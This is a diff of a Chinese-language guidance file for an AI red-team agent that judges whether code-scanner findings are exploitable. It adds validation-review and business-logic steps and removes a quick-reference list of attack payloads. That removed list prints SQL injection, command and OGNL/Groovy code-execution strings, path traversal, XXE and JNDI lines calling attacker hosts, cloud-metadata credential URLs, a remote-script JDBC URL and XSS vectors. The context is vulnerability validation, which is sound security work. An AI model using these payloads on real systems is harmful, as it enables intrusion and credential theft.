@@ -26,6 +26,8 @@ description: 红队攻击验证专家运行时指导。当 RedValidator Agent �
 ### 1. 逐参数可控性分析（最关键步骤）
 - 列出 sink 调用中**每一个**动态参数
 - 对每个参数，沿 `call_chain` 追溯其来源
+- **必须主动读取校验代码**：在 call_chain 的每个节点，检查是否存在输入校验、参数化查询、输出编码、路径规范化等防御逻辑。只看到"有调用"不够，必须确认调用点附近是否有过滤/转义代码。
+- **一旦确认有有效校验，立即输出 NOT_EXPLOITABLE，不要继续构思 PoC**
 - **只要有一个参数可被攻击者控制且未经有效过滤 → 整体判 EXPLOITABLE**
 - 只有**所有**参数都被有效过滤才能判 NOT_EXPLOITABLE
 
@@ -34,61 +36,20 @@ description: 红队攻击验证专家运行时指导。当 RedValidator Agent �
 - 错判 NOT_EXPLOITABLE："前面有 if 判断" —— 但 if 只判断了部分变量
 - 错判 NOT_EXPLOITABLE："需要登录" —— 已登录用户仍可利用
 
+### 1.5 区分漏洞类型
+根据 `vuln_type` 决定分析路径：
+
+**技术类漏洞**（SQL Injection / Command Injection / XSS / Path Traversal / SSRF / XXE / 不安全反序列化 等）：使用步骤1 的"逐参数可控性分析 + 校验审查"
+
+**业务逻辑漏洞**（IDOR / Privilege Escalation / Authentication Bypass / Workflow Bypass / Race Condition / Insufficient Anti-Automation）：使用"权限/状态机审查"
+- 检查目标资源是否有 ownership 校验
+- 检查状态转换是否有前置条件校验
+- 检查并发操作是否有锁/事务保护
+- 检查认证失败是否有计数/限流
+
 ### 2. 构思攻击向量与 PoC
 
-按 `vuln_type` 查阅 `references/INDEX.md` 找到对应文档，重点关注"PoC 模板"段落。
-以下是各漏洞类型的快速参考：
-
-**SQL Injection**
-- 闭合引号：`' OR '1'='1`、`" OR "1"="1`
-- UNION 提取：`' UNION SELECT password FROM users--`
-- 盲注时间型：`' AND SLEEP(5)--`
-- MyBatis `${}`：直接注入列名/表名
-- MSSQL 堆叠查询：`; EXEC xp_cmdshell 'id'`
-
-**Command Injection**
-- shell 元字符：`; id`、`| id`、`&& id`、`$(id)`、`` `id` ``
-- ProcessBuilder 单 argv：`-c` 参数注入或 PATH 劫持
-
-**Code Injection（OGNL / MVEL / Groovy / JEXL）**
-- OGNL：`@java.lang.Runtime@getRuntime().exec({'id'})`
-- MVEL：`Runtime.getRuntime().exec("id")`
-- Groovy：`"id".execute().text`
-- JEXL：`''.getClass().forName('java.lang.Runtime').getMethod('exec',...).invoke(...)`
-- Nashorn：`Java.type("java.lang.Runtime").getRuntime().exec("id")`
-
-**Path Traversal / Zip Slip**
-- Unix：`../../../etc/passwd`
-- URL 双编码：`%2e%2e%2f`
-- Windows：`\..\`
-- UNC：`\\attacker\share`
-- Zip Slip：ZipEntry 名含 `../../../etc/cron.d/malicious`
-
-**XXE**
-- 本地文件读取：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
-- 带外 SSRF：`<!ENTITY xxe SYSTEM "http://attacker/exfil?d=...">`（参数实体）
-
-**SSRF**
-- 内网探测：`http://127.0.0.1:8500/v1/catalog/services`（Consul）
-- 云元数据：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-- DNS rebinding：`*.nip.io` 或自建解析器
-
-**LDAP Injection**：`*` 通配枚举、`)(objectclass=*` 闭合注入
-**XPath Injection**：`' or '1'='1`、布尔盲注 `string-length(password)>5`
-**Unsafe Deserialization**：Commons Collections `InvokerTransformer`、ROME `ToStringBean`、ysoserial 预制 payload
-**JNDI Injection**：`ldap://attacker.com/Exploit`、`rmi://attacker.com/Exploit`
-**JDBC URL Injection**：
-  - MySQL：`jdbc:mysql://attacker/?allowLoadLocalInfile=true`（客户端任意文件读）
-  - H2：`jdbc:h2:mem:;INIT=SCRIPT FROM 'http://attacker/e.sql'`（RCE）
-**XSS**（按输出上下文）：
-  - HTML body：`<script>alert(1)</script>`、`<img src=x onerror=alert(1)>`
-  - HTML 属性：`" onmouseover="alert(1)`
-  - JS 上下文：`';alert(1);//`
-  - URL 属性：`javascript:alert(1)`
-**Open Redirect**：`//attacker.com`、`https:attacker.com`、域名尾注入
-**Unsafe Reflection**：`java.lang.Runtime` / `javax.naming.InitialContext` 作为 Class.forName 参数
-**Trust Boundary Violation**：`/setPref?key=role&value=ADMIN` 写入 session
-**Sensitive Data in Log/URL**：泄露即漏洞，`attack_vector` 写"通过中心化日志泄露"
+按 `vuln_type` 查阅 `references/` 目录下的对应文档获取 PoC 模板。例如 SQL Injection 查阅 `injection-family.md`，XSS 查阅 `xss.md`。
 
 ### 3. 评估最大危害
 - RCE：命令注入、代码注入、不安全反序列化、JNDI 注入
@@ -99,7 +60,7 @@ description: 红队攻击验证专家运行时指导。当 RedValidator Agent �
 ## 输出规范
 
 ### EXPLOITABLE
-必须包含全部字段：
+必须包含全部字段（注意：`max_impact` 必填，不可遗漏）：
 ```json
 {
   "status": "EXPLOITABLE",
@@ -111,16 +72,20 @@ description: 红队攻击验证专家运行时指导。当 RedValidator Agent �
   "suspicion_reason": "复制",
   "attack_vector": "攻击手法描述与绕过思路",
   "poc_payload": "具体的 PoC 请求体或触发参数",
-  "max_impact": "最坏影响评估（如 RCE, Data Leak）"
+  "max_impact": "最坏影响评估（如 RCE、敏感数据泄露、认证绕过、权限提升）"
 }
 ```
 
 ### NOT_EXPLOITABLE
-必须带 `defense_analysis`（≥20 字符），逐参数说明为何不可利用：
+必须带 `defense_analysis`（≥50 字符），必须包含：
+1. **具体防御手段**：使用了什么防护（如 PreparedStatement、HTML 编码、路径规范化、正则校验、权限检查等）
+2. **代码位置**：指明具体文件和行号（如"UserService.java 第 45 行使用 PreparedStatement"）
+3. **防御有效性说明**：为什么这个防御能有效阻止攻击
+
 ```json
 {
   "status": "NOT_EXPLOITABLE",
-  "defense_analysis": "逐参数说明：参数 A 被 X 过滤（第 N 行），参数 B 被 Y 过滤（第 M 行）..."
+  "defense_analysis": "参数 userInput 在 UserService.java 第 45 行使用 PreparedStatement 进行参数化查询，无法注入恶意 SQL。"
 }
 ```
 
